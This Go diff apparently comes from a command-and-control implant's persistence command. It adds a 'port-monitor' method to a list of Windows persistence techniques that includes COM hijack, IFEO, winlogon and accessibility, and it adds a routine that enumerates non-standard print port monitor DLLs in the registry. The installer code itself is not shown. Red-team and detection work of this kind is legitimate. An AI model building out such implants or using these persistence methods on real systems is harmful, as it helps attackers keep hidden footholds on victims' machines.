@@ -70,10 +70,12 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistActiveSetup(args)
 	case "time-provider":
 		return persistTimeProvider(args)
+	case "port-monitor":
+		return persistPortMonitor(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, active-setup, time-provider, port-monitor, or list", args.Method)
 	}
 }
 
@@ -449,6 +451,43 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	if !tpFound {
 		lines = append(lines, "  (no non-standard providers detected)")
+	}
+	lines = append(lines, "")
+
+	// Check Port Monitors
+	lines = append(lines, "--- Port Monitors (HKLM\\...\\Print\\Monitors) ---")
+	pmKey, err := registry.OpenKey(registry.LOCAL_MACHINE, portMonitorRegBase, registry.ENUMERATE_SUB_KEYS)
+	pmFound := false
+	if err == nil {
+		pmNames, _ := pmKey.ReadSubKeyNames(-1)
+		pmKey.Close()
+		// Known legitimate monitors
+		legitimatePM := map[string]bool{
+			"Local Port":              true,
+			"Standard TCP/IP Port":    true,
+			"USB Monitor":             true,
+			"WSD Port":                true,
+			"Microsoft Shared Fax Monitor": true,
+		}
+		for _, pmName := range pmNames {
+			if legitimatePM[pmName] {
+				continue
+			}
+			subPath := portMonitorRegBase + `\` + pmName
+			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
+			if err != nil {
+				continue
+			}
+			driver, _, err := subKey.GetStringValue("Driver")
+			subKey.Close()
+			if err == nil && driver != "" {
+				lines = append(lines, fmt.Sprintf("  ⚠ %s → %s", pmName, driver))
+				pmFound = true
+			}
+		}
+	}
+	if !pmFound {
+		lines = append(lines, "  (no non-standard monitors detected)")
 	}
 	lines = append(lines, "")
 
